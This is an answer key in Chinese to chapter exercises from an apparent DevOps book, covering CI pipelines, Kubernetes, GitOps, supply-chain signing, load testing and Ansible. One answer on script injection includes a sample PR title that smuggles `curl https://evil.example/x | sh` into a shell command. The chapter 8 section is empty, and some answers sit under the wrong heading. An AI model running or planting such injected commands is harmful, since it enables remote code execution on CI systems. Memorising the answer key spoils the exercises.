# Answers collected for Appendix B (Chinese, concise)

## 第 2 章
1. PowerShell → `wsl.exe` 进入 WSL2 虚拟机中的发行版 devops-lab → Docker Engine（dockerd/containerd）中的 Kind 节点容器（如 lab-worker）→ 节点容器内的 containerd → Pod 的容器进程。`docker ps` 只能看到 Kind 节点容器，看不到 Pod；`kubectl get pods` 通过 kubeconfig 访问 API Server，能看到 Pod。要看到进程本身，可以 `docker exec -it lab-worker crictl ps` 或 `kubectl exec`。
2. 代码模式：`fetch URL file` → 从同一 release 取 checksums → `grep 文件名 | sha256sum -c -` → `install -m 0755`。哈希被改错时 `sha256sum -c` 返回非 0（输出 FAILED），`set -e` 让脚本立即退出，后面的 install 不会执行；如果校验在管道中，`-o pipefail` 保证管道中任何一环失败都算失败。
3. 401：服务可达、只是未认证，正常。403：已到达服务但被拒绝（可能是代理/防火墙策略或账号权限）。连接超时：网络不可达（防火墙、代理未配置、DNS 指向错误）。证书错误：存在 TLS 拦截代理或系统时间错误，需要导入企业根证书或校正时间。先用 curl -v 看到底停在哪一步（DNS、TCP、TLS、HTTP）。
4. 用自动化工具（Renovate、Dependabot 的自定义正则管理器）或定期 CI 任务检查新版本，生成修改 versions.env 的合并请求；合并前在 CI 中重建环境并跑冒烟测试；阅读发布说明（尤其是安全公告）；更新与功能开发分开提交，便于回滚。
5. 原因：没有 wsl.exe 会话连接时，WSL 在空闲后关闭整个发行版，Docker 随之停止，节点容器以 128 退出。恢复：`docker start lab-control-plane lab-worker lab-worker2`，等待节点 Ready。预防：实验期间保持一个后台保活会话 `wsl.exe -d devops-lab -- bash -c 'exec sleep infinity'`，或调整 .wslconfig 的空闲超时（影响所有发行版）。

## 第 3 章
1. 去掉 needs 后，image 与 lint/test 并行运行：测试失败时镜像仍会构建并可能“通过”，浪费 Runner 时间；PR 仍会因 python / test 失败而被规则集阻断。cancel-in-progress 写成 true 会在 main 上连续推送时取消正在运行的 main 构建，导致某些主干提交从未被完整验证、缓存也不会保存；表达式只在 pull_request 事件时取消被新提交取代的运行。
2. 增加 `inputs.coverage-threshold: {type: number, default: 90}`，测试命令加 `--cov-fail-under=${{ inputs.coverage-threshold }}`。命令行参数优先于 pyproject.toml 中的 fail_under（pytest-cov 只在没有命令行参数时读取配置文件）。建议只保留一个来源：保留 pyproject.toml，本地与 CI 一致；只有当同一个可复用工作流服务多个阈值不同的仓库、而这些仓库又不便改配置时，才用输入，并且不要两处同时设置。
3. 风险是脚本注入：`${{ }}` 在 shell 执行之前被替换进脚本文本，PR 标题由提交者控制，例如标题为 `"; curl https://evil.example/x | sh; echo "` 时会被当作命令执行（若工作流有写权限或密钥，后果严重）。改写：`env: TITLE: ${{ github.event.pull_request.title }}`，`run: echo "PR title: $TITLE"`——值作为环境变量传入，shell 只把它当数据。
4. ① 检查名不一致：Job 改名、或没写成“调用方 Job 名 / 被调用方 Job 名”——对比 `gh pr checks` 的名称与规则集中的 context。② 工作流根本没被触发：`paths` 过滤、`branches` 过滤（例如 PR 的目标分支不是 main）、工作流被禁用、首次贡献者的 fork PR 需要批准——到 Actions 页面看这个提交有没有运行。③ 上报者不匹配：规则集指定了 integration_id，而检查由别的应用上报——用 `gh api repos/<repo>/commits/<sha>/check-runs` 查看 app.id。
5. 好处：PR 必须先与最新的 main 同步再合并，测试的是“合并之后的样子”，避免两个各自通过的 PR 合在一起出错。代价：main 每前进一次，所有 PR 都要重新同步、重新运行，排队等待时间长。替代方案是合并队列（merge queue）：按顺序把待合并的 PR 叠加在最新 main 上统一测试，通过后自动合并，既保证主干始终是绿的，又不需要人手动反复同步。
6. 可选做法：对所有分支的 push 运行轻量的 lint/test（`branches: ['**']`），镜像构建和安全扫描等较重的作业放在 PR 和 main 上；或者去掉 pull_request 的 `branches` 过滤，让以任何分支为目标的 PR（包括叠加的 PR）都运行；配合 concurrency 取消被取代的运行。更根本的做法是采用短生命周期分支、每个 PR 都直接以 main 为目标（基于主干的开发）。注意：必需检查本身不要加路径过滤。

## 第 4 章
1. Runner 只需出站访问 GitLab，GitLab 不必能访问 Runner，所以 Runner 可以放在内网、防火墙之后，直接接触内网资源（数据库、私有仓库、部署目标）。代价是要自己负责 Runner 的补丁、隔离、伸缩和清理：作业之间可能残留文件和凭据，挂载 Docker socket 等于给作业宿主机 root。托管 Runner 每个作业一台新虚拟机，隔离好、免运维，但访问内网要额外打通网络。适合自托管的场景：需要访问内网、需要特殊硬件（GPU、ARM）、合规要求代码不出内网、构建量大以至于托管 Runner 成本过高。
2. 对本章的配置，什么也不会变。推送事件的来源是 push，不匹配第 1 条；功能分支既不是默认分支，也不是网页触发，第 3、4 条也不匹配；没有规则匹配就不创建流水线。第 2 条是防御性的：常见的写法还会有一条 `if: $CI_COMMIT_BRANCH`（为所有分支创建分支流水线），这时第 2 条才起作用——分支上有打开的 MR 时排除分支流水线。如果去掉第 2 条而保留“所有分支”规则，同一次推送会产生分支流水线和 MR 流水线两条，MR 的 head_pipeline 可能指向分支流水线，而它不包含只在 MR 中运行的作业，“流水线必须成功”就可能依据了错误的那一条。这道题考查的是“按顺序匹配、第一条生效、都不匹配则不创建”的语义。
3. MR 中 `build-image` 的 `rules:changes: [app/**/*]` 不满足，作业不会被创建；`deploy-dev` 却在 MR 中存在并 `needs` 它，GitLab 在创建流水线时发现依赖的作业不存在，于是整条流水线创建失败。修复：① 把依赖写成可选的 `needs: [{job: build-image, optional: true}]`，并在部署脚本中处理没有新镜像的情况；② 让两者的 rules 一致（`deploy-dev` 在 MR 中也加上相同的 `changes` 条件），保证它们总是同时存在或同时不存在。
4. 作业示例：`security: {stage: test, image: aquasec/trivy:<固定版本>, needs: [], script: [trivy fs --scanners vuln,secret,misconfig --severity HIGH,CRITICAL --ignore-unfixed --exit-code 1 --skip-dirs manual --cache-dir .cache/trivy .], cache: {key: trivy-db, paths: [.cache/trivy]}, rules: [{if: '$CI_PIPELINE_SOURCE == "merge_request_event"'}, {if: '$CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH'}]}`。数据库放进缓存目录，按天换键（例如 key 中带日期）可以兼顾新鲜度和速度。
5. 日志可能已被复制、缓存、转发到其他系统或被人看过，删除日志并不能让凭据失效；只要令牌有效，任何拿到它的人都可以注册假 Runner 窃取作业（含源代码和 CI 变量）。标准顺序：① 立即吊销/删除该凭据（本例中删除 Runner，令牌随即失效）；② 评估暴露范围与期间的使用记录（审计日志）；③ 签发新凭据并更新使用方；④ 清理日志、制品、Git 历史中的残留；⑤ 修复泄露的根因（本例为脱敏正则未处理 ANSI 码），并验证修复；⑥ 复盘记录。
6. 防的是缓存投毒：不受信任的分支（任何人都能开 MR）向缓存写入被篡改的依赖或二进制，受保护分支的发布作业再读取并打包进发布产物。分开缓存后，main 只会读取由受保护分支自己生成的缓存。如果共享，攻击者可以在 MR 中修改依赖安装步骤，把恶意 wheel 写进 pip 缓存，等 main 的构建命中缓存时就把恶意代码带进正式镜像。

## 第 5 章
1. 放进 liveness：数据库一抖，所有 Pod 的 liveness 同时失败，kubelet 把它们全部重启；重启解决不了数据库的问题，反而造成整体不可用和重启风暴。放进 readiness：所有 Pod 同时变为未就绪，从 Service 后端摘除，调用方拿到连接失败——比重启好，但同样是全体不可用。建议：liveness 只检查进程自身是否卡死（如本项目的 `/healthz`，不访问依赖）；readiness 检查“我能否正确处理请求”，对依赖的检查要宽容（超时短、带缓存、或只在启动阶段检查），依赖故障更适合用熔断、降级和告警处理，而不是让所有实例一起下线。
2. 当前 Chart（0.3.1）渲染后的差异有两处：遗留 ConfigMap 中的 `FAULT_LATENCY_MS: "800"`（新 Pod 已不再读取它），以及 Pod 模板 `env` 中 `FAULT_LATENCY_MS` 的值由 "0" 变为 "800"。Pod 模板变了，哈希就变，所以会创建新的 ReplicaSet：Deployment 进行滚动更新；在第 8 章的 Rollout 中，这就是一个新的修订，要完整走一遍金丝雀。
3. `--set` 只把整数和布尔值转换为对应类型，`0.5` 被当作字符串 "0.5"，而 schema 要求 number，于是在渲染前就被拒绝，且不产生新修订。正确写法：`--set-json 'faults.errorRate=0.5'`，或把 `faults: {errorRate: 0.5}` 写进一个 values 文件用 `-f` 传入。
4. 软反亲和是“尽量分散”，无法满足时仍然调度。3 个副本、2 个可调度节点时，硬反亲和（每个节点最多一个）只能放下 2 个 Pod，第 3 个永远 Pending，PDB（minAvailable 2）也会让节点维护更困难。必须用硬规则的场景：同一节点上放两个副本就失去意义或违反要求的情况，例如有状态集群的成员（数据库、ZooKeeper/etcd 副本）必须跨节点或跨可用区，以保证单点故障不会同时带走多数派；或合规要求跨故障域部署。
5. Helm 的回滚是“用修订 2 的内容生成一个新的修订”，历史只追加、不改写：谁在什么时候回滚到了什么内容，都留在 history 中，修订 4（坏发布）的内容也仍可查询（`helm get values --revision 4`），便于复盘。根本区别：helm rollback 改变的是集群状态，Git 中的期望状态没有变，下一次从 Git 部署会把坏配置带回来；GitOps 回滚是对 Git 的一次 revert 提交，期望状态本身被修正，集群跟随 Git，三者（Git、Argo CD、集群）保持一致。
6. Chart 0.3.0 中所有 ReplicaSet 通过 envFrom 读取同一个 ConfigMap：配置变了，只有在 Pod 启动时才读取，所以稳定版 ReplicaSet 在中止扩容时新建的 Pod 读到的是当时 ConfigMap 中的坏值。0.3.1 把配置写进 Pod 模板，配置成为模板（和哈希）的一部分：稳定版 ReplicaSet 的模板里是 0，金丝雀的模板里是 800，任何时候新建的 Pod 都只能拿到所属 ReplicaSet 的配置。不可变 ConfigMap 方案（例如 `demo-api-prod-config-<内容哈希>`，并在 Pod 模板中引用这个名字）效果相同：配置内容变 → 名字变 → Pod 模板变 → 新 ReplicaSet，旧 ReplicaSet 仍引用旧的 ConfigMap。区别在于：它适合配置较大或包含文件的场景，但要负责清理不再被引用的旧 ConfigMap；env 方案简单，适合少量键值。两者共同的原则是“配置与 Pod 模板一起版本化”。

## 第 6 章
1. Synced + Healthy：集群与 Git 一致且运行正常，例如第 6 章第 5 步发布完成后（`f65c674`）。Synced + Degraded：对象与 Git 一致，但对象自身报告失败，例如第 12 章演练 B 中坏配置的 Rollout 被分析中止后。OutOfSync + Healthy：集群偏离 Git 但服务正常，例如第 6 章有人把 prod 手动扩容到 5 个副本。Synced + Progressing：刚同步完新版本，Pod 还在滚动，例如第 6 章 wait-sync 输出的 t+81s。
2. 开启 selfHeal 时，Argo CD 会把 HPA 改过的副本数立刻改回 Git 中的值，HPA 再改回去，两个控制器来回拉锯。解决：在 Application 中加 `ignoreDifferences: [{group: apps, kind: Deployment, jsonPointers: [/spec/replicas]}]`，并在 `syncOptions` 中加 `RespectIgnoreDifferences=true`，让同步时也不覆盖该字段；更彻底的做法是 Chart 在启用 HPA 时不渲染 `replicas`（本项目 Chart 的 hpa.yaml 已按这个思路设计）。之后手动扩容，应用仍显示 Synced。
3. root 的个人令牌拥有整个 GitLab 的管理员权限且不过期：一旦从 argocd 命名空间的 Secret 泄露（任何能读该命名空间 Secret 的人或进程都能拿到），攻击者就能改写任意仓库（包括配置仓库，等于直接部署生产）、读取所有源代码、创建用户和令牌。配置仓库需要：main 受保护、只能经合并请求修改；envs/prod 设代码所有者与必需审批；限制有合并权限的人；合并请求流水线做策略检查；审计日志；Argo CD 只持有只读、限定单仓库、会过期的令牌。
4. ① 确认合并确实落在 Argo CD 跟踪的分支（targetRevision）上：`git log origin/main`。② `argocd app get <app> --refresh`，看是否识别到新提交、有没有 ComparisonError（仓库认证失败、Helm 渲染错误、values 路径错误）。③ `argocd repo list` 和 repo-server 日志，确认能访问仓库。④ 检查自动同步是否开启；如果上一次对同一提交的自动同步失败，Argo CD 默认不会自动重试同一个提交（需要配置 retry 或手动 sync）。⑤ 检查同步窗口（sync windows）是否禁止了当前时段。⑥ 检查 application-controller 是否健康、队列是否积压，以及 `timeout.reconciliation` 的设置。
5. selfHeal 让事故恶化的例子：事故中值班人员手动扩容、修改环境变量或临时关闭某个功能来止血，selfHeal 立刻把改动还原，故障再次出现，甚至人和控制器反复拉锯。关闭 selfHeal 的风险：有人误操作或越权修改（例如把镜像换成未经扫描的版本）后，偏离会一直存在，直到有人注意到 OutOfSync；所以关闭 selfHeal 时要对 OutOfSync 设置告警，并定期审视。
6. 最快的做法通常仍是 `git revert` 坏的合并提交，走一个预先约定的加急审批，然后立即 `argocd app sync`（或配置 webhook，免去等待轮询）。确实需要更快时，可以执行“破窗”流程：临时关闭自动同步，用 `argocd app rollback` 回到历史版本止血，随后补一个 revert 合并请求让 Git 与集群重新一致，再恢复自动同步。平衡的关键是：破窗流程事先写好、有时限、所有操作都有记录，事后必须让 Git 回到正确状态并在复盘中说明。

## 第 7 章
1. 理由：暂无修复的漏洞没有可执行的修复动作，阻断只会让所有发布停下来；门禁应当促使人去做能做的事（升级到有修复的版本）。不够用的情况：漏洞在你的使用方式下确实可被利用（组件被调用、端口对外暴露），或者已被列入“已知被利用漏洞”清单——这时要采取补偿措施：移除用不到的组件、更换基础镜像、网络隔离或 WAF 规则，并以有期限的风险接受记录下来；对确认不可利用的，可用 VEX 文档说明。另外要定期统计“长期无修复”的数量，作为更换基础镜像的依据。
2. 时序见本章图：GitHub OIDC 提供身份（JWT），Fulcio 用它签发约 10 分钟的短期证书（SAN = 工作流身份），作业用一次性私钥签名后丢弃私钥，Rekor 记录签名并给出带时间戳的收录证明。验证者信任的是 Fulcio 根证书（通过 Sigstore 的信任根分发），检查证书链、SAN、签发者，并用收录证明确认签名发生在证书有效期内，所以不需要任何长期公钥。
3. 输出中的 `sourceRepositoryDigest` 是提交，`githubWorkflowRef`（或 buildConfigURI）是工作流引用，`githubWorkflowTrigger` 是触发事件（如 push），`runnerEnvironment` 为 `github-hosted`。只接受 main：`subjectRegExp: '^https://github\.com/miku-wwl/devops-delivery/\.github/workflows/release\.yml@refs/heads/main$'`（用 `^...$` 锚定，去掉 `.+`）。
4. ① 本地用 cosign 按同样的身份条件验证，确认镜像上到底挂着什么（Sigstore 包还是旧式 `.sig` 标签）；② 策略中设置 `type: SigstoreBundle`（Cosign v3 与 GitHub 证明使用包格式）；③ 从 cosign 的报错或证明页面读出证书中真实的 SAN，与策略中的 subject/正则逐字比对，注意分支名中的 `/` 会让通配符失配，改用锚定的正则；④ 核对签发者 URL 是否完全一致；⑤ 若验证的是证明，核对谓词类型（`https://slsa.dev/provenance/v1`）；⑥ 检查 Kyverno 能否访问 Rekor 与镜像仓库、webhook 超时是否足够，并查看 Kyverno 日志与策略状态。
5. 镜像层只能叠加：上层删除文件只是加了一个“遮盖”记录，下面的基础镜像层里 pip 仍然存在，所以体积不变（扫描器看的是合并后的文件系统，漏洞因此消失）。方案：多阶段构建中，在 build 阶段安装依赖并删除 pip，运行时阶段从一个不含 pip 的基础镜像开始（例如 distroless 的 Python 镜像，或 `debian:*-slim` 加从构建阶段 `COPY --from=build /usr/local /usr/local`），最终镜像的任何一层都不含 pip；完成后再用 Trivy 扫描、比较体积，并跑完整的测试与冒烟测试。
6. PR 阻断防的是开发者无意中引入的漏洞依赖（最早、最便宜）；发布门禁防的是“合并后才曝出 CVE”或合并规则被绕过的情况，保证有漏洞的镜像不会被推送和签名；准入控制防的是一切不是由我们流水线构建的镜像——手工推送、被盗的仓库凭据、有 kubectl 权限的攻击者。若只能留一道，多数人会选准入控制，因为它是运行前最后一道、能覆盖绕过；但它只验证来源，验证不了“我们自己构建的镜像有没有漏洞”。每道防线只覆盖一部分失效方式，单靠任何一道都不够，这正是纵深防御的意义。

## 第 8 章

## 第 11 章
1. check 只记录每次断言成功与否，本身不会让测试失败；threshold 是对整个运行期间指标的要求，任何一个不满足，k6 就以退出码 99 结束。延迟演练中，状态码、返回字段、总价计算都正确，所以断言全部通过；但下单接口的 p95 达到约 600 ms，超过 300 ms 的阈值，于是门禁失败。“功能正确”和“足够快”是两类要求，需要两类判定。
2. 本题注入的是固定延迟（每次下单多睡 600 ms），所以封闭模型下下单接口的 p95 同样约为 600 ms，门禁照样失败；变化在于总请求数：每个虚拟用户要等响应回来才发下一个请求，迭代变慢，总请求数明显减少，服务端承受的压力随之下降。对于“负载升高后排队变慢”这类问题，封闭模型会在服务变慢时自动降低发送速率，压力减轻、排队消失，问题被掩盖（即“协调遗漏”）；开放模型坚持固定的到达速率，排队会累积，延迟随之暴露，虚拟用户不够时 k6 还会报告 `dropped_iterations`。
3. 例如在 thresholds 中加入 `iterations: ['count>=228']`（60 秒 × 每秒 4 次 = 240 次，留 5% 余量）或 `http_reqs: ['count>=684']`（每次迭代 3 个请求），以及 `dropped_iterations: ['count==0']`。这样即使场景配置错误只跑了几秒、或负载生成端资源不足，门禁也会失败，而不是“没测就通过”。
4. ① 看 k6 汇总中是哪个接口、在运行的哪个阶段变慢（开头的冷启动还是全程），以及 `dropped_iterations` 和虚拟用户的使用量，判断负载生成端是否吃紧；② 查看临时集群中 Pod 的重启、事件和资源使用；③ 检查 port-forward 是否中断或重连（它本身会增加延迟）；④ 对比服务端自身的指标（Pod 的 /metrics 直方图）：服务端快、客户端慢，多半是测试环境或网络问题；服务端也慢，才是被测服务的问题；⑤ 托管 Runner 有“吵闹的邻居”，CPU 被抢占时也会出现尖刺。缓解：测量前加预热阶段；改为在集群内用 k6 Job 直接访问 Service，绕过 port-forward；阈值保留余量；允许有限的自动重试时要记录每次结果，避免掩盖真实的退化。
5. 让 synthetic-gate.yml 也响应 `pull_request`（或在 ci.yml 中作为一个作业调用它），再把它的检查名加入规则集的必需检查。成本：每次推送约多 2.5 分钟 Runner 时间，可以用 concurrency 取消被取代的运行，用缓存加速镜像构建；必需检查不能加路径过滤（否则会一直显示 Expected），需要时用“检测是否有相关改动、无改动则直接成功”的作业代替。安全：门禁不需要任何密钥和写权限，应使用 `pull_request` 事件，绝不能用 `pull_request_target` 去执行 fork 中的代码；权限保持 `contents: read`。

4. 改法一：把它的 severity 改为 ticket，在 Alertmanager 中路由到不呼叫人的接收器（看板、工单）。代价：整体故障时少了一路快速呼叫，但快速燃烧告警已经覆盖。改法二：拉长窗口和持续时间（例如 5 分钟 p95、`for: 10m`），被金丝雀限制、一分钟内就被中止的问题永远不会触发。代价：真实的持续性延迟问题要晚几分钟才告警。改法三：只统计稳定版（按 `role="stable"` 过滤），金丝雀的问题交给分析处理。代价：依赖角色标签，且金丝雀自身的问题不再有告警兜底。取舍原则：呼叫人的告警应当对应“需要人立即行动、并且会影响用户承诺”的情况。
5. 为什么响应里没有 X-Request-ID？请求是旧容器回答的。为什么会打到旧容器？127.0.0.1:18081 被第 4 章的 Docker 容器占用，port-forward 只绑定了 IPv6。为什么会端口冲突？第 4 章的部署容器一直在运行，占用固定端口，而实验环境没有端口分配记录，新测试恰好选了同一个端口。为什么没有立刻发现？port-forward 的输出被丢弃，它部分绑定成功、没有退出。为什么测试没能识别？冒烟测试没有先确认回答它的是哪个版本。预防：冒烟测试第一步先请求版本接口，核对版本和提交；让 kubectl 自动选择本地端口（例如 `kubectl port-forward svc/x :80`）并从输出中读取，或检查输出中必须包含 `127.0.0.1` 的绑定；及时清理不再使用的部署，维护端口分配表。
6. 等待：Argo CD 轮询（每个环境约 1 分钟）、人工观察分析数据 2 分 45 秒、dev 金丝雀暂停 30 秒、prod 金丝雀暂停 60 秒 + 30 秒。验证：合成测试门禁 2 分 50 秒、扫描与签名 1 分 50 秒、消费者验证、端到端关联验证、金丝雀分析。计划外的返工：修复 CI 揭出的问题约 17 分钟。缩短到 15 分钟以内：配置 Git webhook（省约 2 分钟）；让 lint/test/security 在每次推送时运行，问题在开发阶段就暴露，避免发布时返工；CI 与发布流水线并行；当分析连续 N 次健康时自动晋级，取消常规变更的人工闸门（高风险变更保留审批）；缩短暂停时间、加强分析指标。代价：人的把关减少，更依赖分析质量，细微的退化可能更快扩散到全部流量。

## 第 13 章
1. `update_cache: true` 每次运行都会刷新软件包索引，模块如实报告 changed；`cache_valid_time: 3600` 表示索引在 1 小时内刷新过就不再刷新。其他常见的破坏幂等的写法：`command`/`shell` 任务没有 `changed_when` 或 `creates`；模板中包含时间戳、随机数等每次都变的内容；`lineinfile` 的正则与它插入的行不匹配，导致每次都追加一行；`mode` 写成不加引号的数字（如 0644 被当作十进制或八进制而产生歧义）。
2. 连接插件只负责“把文件传过去、执行命令、取回输出”，playbook 描述的是任务和期望状态，与连接方式无关。执行时，Ansible 把模块代码和参数打包成自包含的 Python 程序（AnsiballZ），经连接插件传到节点（或经标准输入），用节点的 python3 执行；模块读取当前状态，与期望状态比较，不同才修改，并在返回的 JSON 中报告 `changed`。
3. node1 为 3：Inventory 的 `group_vars` 优先级高于角色的 `defaults`（1）。node2 为 2：`host_vars` 优先级高于 `group_vars`。同一份模板因此渲染出不同的结果，与第 5 章 Helm 中“后面的 values 覆盖前面的”是同一种分层思想。
4. 对应任务：`ansible.builtin.user`（name、shell、create_home、groups: docker、append: true）；`ansible.builtin.copy` 写 `/etc/sudoers.d/90-devops`，`mode: "0440"`，并用 `validate: "visudo -cf %s"` 防止写坏 sudoers 把自己锁在门外；`ansible.builtin.get_url` 下载 Docker 的 GPG 公钥（带 checksum）；`ansible.builtin.deb822_repository` 声明软件源；`ansible.builtin.apt` 安装 docker-ce 等软件包。相比原脚本：每一步都是声明式的，读起来就是期望状态；`--check --diff` 能在执行前看到将要发生的变化；模块自带幂等，不用自己写 `id ... ||` 之类的判断。不足：控制节点需要先装好 Ansible，而 bootstrap 脚本本来就是为了“从零开始”。
5. 方法一：只读的命令写 `changed_when: false`；会改变状态的命令按输出精确判断，例如 `changed_when: "'installed' in result.stdout"`（本章 raw 任务的写法）。方法二：用 `creates:`/`removes:` 参数，让命令只在目标文件不存在（或存在）时才执行。最好的做法是换成对应的模块。
6. Argo CD 通过 watch 持续感知集群变化，几秒内就能发现漂移，并按策略自愈或报告；它运行在环境内部，主动拉取。Ansible 只有在运行时才会发现漂移，两次运行之间的偏离是看不见的；推送模式还要求控制节点持有访问所有节点的凭据。让 Ansible 接近持续收敛：定时在 CI 中运行 `--check --diff` 并对差异告警，再定期以正式模式运行；在每个节点上使用 `ansible-pull`（节点定时拉取仓库并在本地执行，与 GitOps 的拉取模型相同）；或使用 AWX/Automation Controller 的定时任务和事件驱动的 Ansible。
